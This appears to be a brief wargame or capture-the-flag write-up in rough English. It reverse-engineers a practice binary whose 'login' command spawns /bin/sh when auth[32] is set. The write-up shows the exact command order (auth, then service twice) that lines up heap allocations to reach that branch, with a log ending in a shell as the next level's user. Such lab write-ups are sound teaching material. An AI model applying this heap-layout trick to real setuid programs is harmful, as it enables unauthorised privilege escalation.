...
ok this function is a quit long but we can easily understand that there is\
a loop cause sometime the main jump back to previous instruction ```jmp    0x8048574 <main+16>``` for example, after a lot of if
## I
print memory address of both global var
(nil), (nil) -> at beginning

## II
there is a lot of cmp with buffer and string already wrote in the program:
- "auth "
- "reset"
- "service"
- "login"\
each of them do something differents before going back to the beginning of the main function.

## III

if the ```login``` command is given there is one more cmp that can call system with ```/bin/sh``` as arg if auth[32] != 0

# find the good order of command

## reminder

each pointer is placed right after the previous one with some padding between.
...
0x804a008, (nil) 
service
0x804a008, 0x804a018 // service - auth = 16(dec) or 0x10(dec)
<!-- so write 2 times service after auth could call system('/bin/sh') -->
service
0x804a008, 0x804a028 // service - auth = 32
login
$ whoami
level9
...
so to modify auth[32] he have to call auth in first and make 2 times the service command